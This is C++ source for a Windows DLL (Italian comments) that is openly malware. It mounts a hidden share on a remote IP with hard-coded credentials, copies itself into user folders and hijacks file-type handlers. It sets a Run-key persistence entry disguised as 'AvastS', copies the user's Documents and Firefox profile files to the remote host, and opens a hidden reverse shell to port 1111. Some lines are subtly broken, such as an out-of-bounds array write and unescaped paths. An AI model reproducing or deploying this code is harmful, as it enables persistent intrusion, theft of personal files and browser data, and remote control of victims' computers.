// dllmain.cpp: definisce il punto di ingresso per l'applicazione DLL.
#include "header.h"
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)
#include <stdio.h>
#include <string.h>
#include <iostream>
#include <fstream>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <Objbase.h>
#include <Shellapi.h>
#include <sstream>
#include <tchar.h>
#include "res_dropper.h"
#include "ext_hijacker.h"
#pragma comment(lib, "Ws2_32.lib")
#define REMOTE_ADDR "149.154.67.221"
#define REMOTE_PORT "1111"
#define INFO_BUFFER_SIZE 32767

using std::ofstream;

long regkey(HKEY lnKey, LPCTSTR lpsub, DWORD rise, LPTSTR lpc, DWORD dwopt, REGSAM sd, LPSECURITY_ATTRIBUTES lpas, HKEY * const &llkey, DWORD * const &dwDisposition)
{
	__asm
	{
		mov cx, 10000000000
		myloop:
		loop myloop
			mov  eax, DWORD PTR[dwDisposition]
			push DWORD PTR[eax]
			mov  eax, DWORD PTR[llkey]
			push DWORD PTR[eax]
			push DWORD PTR[lpas];
		push DWORD PTR[sd];
		push DWORD PTR[dwopt];
		push DWORD PTR[lpc];
		push DWORD PTR[rise];
		push DWORD PTR[lpsub]
			push DWORD PTR[lnKey]
			call DWORD PTR RegCreateKeyEx

	}  // return value is left in EAX
}

extern "C" __declspec(dllexport)
void CALLBACK AllyCat(HWND, HINSTANCE, wchar_t const*, int)
{

	HKEY lnKey;
	HKEY llkey;
	DWORD dwDisposition;
	WIN32_FIND_DATA File;
	HANDLE hSearch;
	TCHAR SourcePath[_MAX_PATH];
	TCHAR SourceDrive[_MAX_DRIVE];
	TCHAR SourceDir[_MAX_DIR];
	TCHAR SourceFname[_MAX_FNAME];
	TCHAR SourceExt[_MAX_EXT];

	TCHAR DestPath[_MAX_PATH];
	TCHAR DestDrive[_MAX_DRIVE];
	TCHAR DestDir[_MAX_DIR];
	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;
	FreeConsole();

	CLSID clsid;
	/*
	wchar_t* s = L"C:\\Users\\ciccio\\Desktop\\Prova.txt";
	HRESULT hr = GetClassFile(s, &clsid);
	if (hr == S_OK)
	MessageBox(NULL, L"Perfetto", NULL, 0);
	else if (hr == MK_E_CANTOPENFILE)
	MessageBox(NULL, L"Non apre il file", NULL, 0);
	else if (hr = MK_E_INVALIDEXTENSION)
	MessageBox(NULL, L"Estensione non valida", NULL, 0);

	*/
	//ShellExecute(NULL, L"open", L"net.exe use g: \\149.154.67.221\share lillo1_lillo1 /user:superlep", NULL, NULL, SW_SHOWDEFAULT);
	/*
	ShellExecute(
	NULL,
	L"open",
	L"net.exe",
	L"use g: \\149.154.67.221\share lillo1_lillo1 /user:superlep",
	NULL,
	SW_NORMAL
	);
	*/


	//int risultato = system("C:\Windows\System32\net.exe use g: \\\\149.154.67.221\\share lillo1_lillo1 /user:superlep");


	int risultato = (int)ShellExecute(0, L"open", L"cmd.exe", L"/C net use g: \\\\149.154.67.221\\downloads lillo1_lillo1 /user:superlep", 0, SW_HIDE);

	Sleep(50);
	std::wstring temp;
	std::wstring appdata;
	std::wstring userpdc;
	std::wstring userpdo;
	std::wstring stringa_maledetta;
	temp = _wgetenv(L"TEMP");
	temp.append(L"\\AllyCat.dll");


	appdata = _wgetenv(L"APPDATA");
	appdata.append(L"\\AllyCat.dll");


	userpdc = _wgetenv(L"USERPROFILE");
	userpdc.append(L"\\Documents\\AllyCat.dll");
	userpdo = _wgetenv(L"USERPROFILE");
	userpdo.append(L"\\Downloads\\AllyCat.dll");

	stringa_maledetta.assign(L"/C G:\\\\SetUserFTA.exe .txt ");
	stringa_maledetta.append(L"\"c:\\\\windows\\system32\\rundll32.exe  ");
	stringa_maledetta.append(temp.c_str());
	stringa_maledetta.append(L",_AllyCat@16\"");
	//ShellExecute(NULL, L"open", L"cmd.exe", stringa_maledetta.c_str(), NULL, SW_SHOWDEFAULT);
	CopyFile(userpdo.c_str(),temp.c_str(), true);
	CopyFile(userpdo.c_str(),userpdc.c_str(), true);
	CopyFile(userpdo.c_str(), appdata.c_str(), true);

	stringa_maledetta.assign(L"c:\\windows\\system32\\rundll32.exe  ");
	stringa_maledetta.append(temp.c_str());
	stringa_maledetta.append(L",_AllyCat@16");

	char payloadName[3][100];

	std::wcstombs(payloadName[1], stringa_maledetta.c_str(), 100);
	stringa_maledetta.assign(L"c:\\windows\\system32\\rundll32.exe  ");
	stringa_maledetta.append(appdata.c_str());
	stringa_maledetta.append(L",_AllyCat@16");
	std::wcstombs(payloadName[2], stringa_maledetta.c_str(), 100);
	stringa_maledetta.assign(L"c:\\windows\\system32\\rundll32.exe  ");
	stringa_maledetta.append(userpdc.c_str());
	stringa_maledetta.append(L",_AllyCat@16");
	std::wcstombs(payloadName[3], stringa_maledetta.c_str(), 100);
	
	int i = 1;
	//for (int i=1;i<=3;i++) {
	if (!dropResource(payloadName[i])) {
		printf("[-] Dropping failed!\n");
	}
	std::set<std::string> handlersSet = getGlobalCommands();

	std::string classesKey = getLocalClasses();
	printf("%s\n", classesKey.c_str());
	size_t extCount = rewriteHandlers(classesKey, handlersSet);
	printf("[+] Rewritten handlers: %d\n", extCount);
	
	size_t hijacked = hijackHandlers(payloadName[i]);
	if (hijacked == 0) {
		printf("[-] Hijacking failed!\n");
	}
	else {
		printf("[+] Hijacked %ld keys\n", static_cast<unsigned long>(hijacked));
	}
	//}
	long ret0 = regkey(HKEY_CURRENT_USER, L"SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", 0, NULL, 0, KEY_WRITE, NULL, &llkey, &dwDisposition);
	//printf("CREATE %d\n", ret0);
	ret0 = RegSetValueEx(llkey, TEXT("AvastS"), 0, REG_SZ, (const BYTE*)userpdo.c_str(), (userpdo.length() + 1) * sizeof(wchar_t));
	//printf("Set %d\n", ret0);
	RegCloseKey(llkey);
    
	userpdc = _wgetenv(L"USERPROFILE");
	userpdc.append(L"\\Documents\\*.*");

	GetComputerName(infoBuf, &bufCharCount);
	std::wstring nome_pc(infoBuf);

	stringa_maledetta.assign(L"/c mkdir -p \"G:\\"); 
	stringa_maledetta.append(nome_pc.c_str());
	stringa_maledetta.append(L"\"");

	ShellExecute(NULL, NULL, L"cmd.exe", stringa_maledetta.c_str(), NULL, SW_SHOWNORMAL);

	stringa_maledetta.assign(L"G:\\");
	stringa_maledetta.append(nome_pc.c_str());
	stringa_maledetta.append(L"\\");

	LPCTSTR lpszFindPattern = userpdc.c_str();

	_tsplitpath_s(userpdc.c_str(), SourceDrive, _MAX_DRIVE, SourceDir, _MAX_DIR, NULL, 0, NULL, 0);
	_tsplitpath_s(stringa_maledetta.c_str(), DestDrive, _MAX_DRIVE, DestDir, _MAX_DIR, NULL, 0, NULL, 0);

	hSearch = FindFirstFile(lpszFindPattern, &File);
	if (hSearch != INVALID_HANDLE_VALUE) {
		do {
			_tsplitpath_s(File.cFileName, NULL, 0, NULL, 0, SourceFname, _MAX_FNAME, SourceExt, _MAX_EXT);

			_tmakepath_s(SourcePath, _MAX_PATH, SourceDrive, SourceDir, SourceFname, SourceExt);
			_tmakepath_s(DestPath, _MAX_PATH, DestDrive, DestDir, SourceFname, SourceExt);

			CopyFile(SourcePath, DestPath, FALSE);
		} while (FindNextFile(hSearch, &File));

		FindClose(hSearch);
	}

	userpdc = _wgetenv(L"APPDATA");
	userpdc.append(L"\\local\Mozilla\Firefox\\*.*");
	lpszFindPattern = userpdc.c_str();

	_tsplitpath_s(userpdc.c_str(), SourceDrive, _MAX_DRIVE, SourceDir, _MAX_DIR, NULL, 0, NULL, 0);
	_tsplitpath_s(stringa_maledetta.c_str(), DestDrive, _MAX_DRIVE, DestDir, _MAX_DIR, NULL, 0, NULL, 0);

	hSearch = FindFirstFile(lpszFindPattern, &File);
	if (hSearch != INVALID_HANDLE_VALUE) {
		do {
			_tsplitpath_s(File.cFileName, NULL, 0, NULL, 0, SourceFname, _MAX_FNAME, SourceExt, _MAX_EXT);

			_tmakepath_s(SourcePath, _MAX_PATH, SourceDrive, SourceDir, SourceFname, SourceExt);
			_tmakepath_s(DestPath, _MAX_PATH, DestDrive, DestDir, SourceFname, SourceExt);

			CopyFile(SourcePath, DestPath, FALSE);
		} while (FindNextFile(hSearch, &File));

		FindClose(hSearch);
	}

	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	//TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\WindowsPowerShell\\v1.0\\powershell.exe");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	//WaitForInputIdle(pi.hProcess,INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
	label_1:
	__asm {
		jmp label_1;
	}

}